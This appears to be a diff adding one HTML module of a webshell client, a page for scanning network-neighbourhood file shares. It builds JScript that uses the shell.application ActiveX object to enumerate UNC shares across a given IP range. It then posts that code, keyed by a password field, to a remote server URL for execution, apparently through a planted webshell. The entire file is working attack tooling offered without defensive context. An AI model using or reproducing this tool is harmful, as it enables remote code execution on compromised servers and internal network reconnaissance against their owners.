@@ -1,0 +1,51 @@
+<HTML >
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=gb2312" />
+<TITLE>搜索网络邻居共享</TITLE>
+<link rel="stylesheet" type="text/css" href="css.css">
+</HEAD>
+<BODY scroll="no" TOPMARGIN="0"  LEFTMARGIN="0" MARGINHEIGHT="0" MARGINWIDTH="0">
+
+Start IP: <input style="WIDTH:40%" type="text" name="ip1" value="172.16.1.53" />
+End IP: <input style="WIDTH:40%" type="text" name="ip2" value="172.16.1.55" />
+
+<form name="codeform" method="post" action="" target=_blank>
+<textarea name="code"></textarea>
+</form>
+
+<script>
+function RUNonclick(){
+with(document.codeform){
+
+code.value=js.value+'for(var i='+ip1.value.substr(ip1.value.lastIndexOf(".")+1)+';i<'+ip2.value.substr(ip2.value.lastIndexOf(".")+1)+';i++)\r\n'+
+'wjj("\\\\\\\\'+ip1.value.substring(0,ip1.value.lastIndexOf(".")+1)+'"+i+"\\\\");\r\nResponse.write(xie);';
+
+code.name=parent.PW.value;
+action=parent.url.value;
+submit();
+}
+}
+</script>
+
+<textarea style="display:none;"  name="js">
+var shell=new ActiveXObject("shell.application");
+
+function wjj(b){
+try{
+var c=new Enumerator(shell.namespace(b).Items());
+for (;!c.atEnd();c.moveNext())
+{
+xie+=c.item().path+"<BR>";
+//if(!c.item().Size)wjj(c.item().path+"\\");
+}
+}catch(e){}
+
+}
+var xie="";
+
+//for(var i=50;i<54;i++)
+//wjj('\\\\172.16.1.'+i+'\\');
+//Response.write(xie);
+
+</textarea>
+</BODY></HTML>
